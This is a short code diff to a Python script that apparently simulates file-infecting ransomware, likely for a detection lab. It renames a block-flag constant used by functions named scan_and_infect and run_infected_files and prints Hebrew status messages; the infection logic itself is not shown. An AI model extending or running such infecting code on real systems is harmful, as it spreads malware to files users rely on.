@@ -5,8 +5,7 @@ import sys
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
 
 from modules.utils import log_summary
-from modules.constants import DETECTION_FILE
-BLOCK_FILE = "/tmp/block_ransom"
+from modules.constants import DETECTION_FILE, BLOCK_FLAG
 
 INFECTION_MARKER = "#infected"
 TRIGGER_SCRIPT_PATH = os.path.abspath(
@@ -66,7 +65,7 @@ def scan_and_infect(directory):
                 infect_file(filepath)
 
 def run_infected_files(directory):
-    if os.path.exists(BLOCK_FILE):
+    if os.path.exists(BLOCK_FLAG):
         print("🔒 חסימה הופעלה – לא נריץ קבצים נגועים.")
         return
 
@@ -96,8 +95,8 @@ if __name__ == "__main__":
     clear_detection_log()
         
 
-    if os.path.exists(BLOCK_FILE):
-        os.remove(BLOCK_FILE)
+    if os.path.exists(BLOCK_FLAG):
+        os.remove(BLOCK_FLAG)
 
     print("[*] שלב 2: הדבקת קבצים נגועים (ללא הרצה)")
     scan_and_infect(TARGET_DIR)
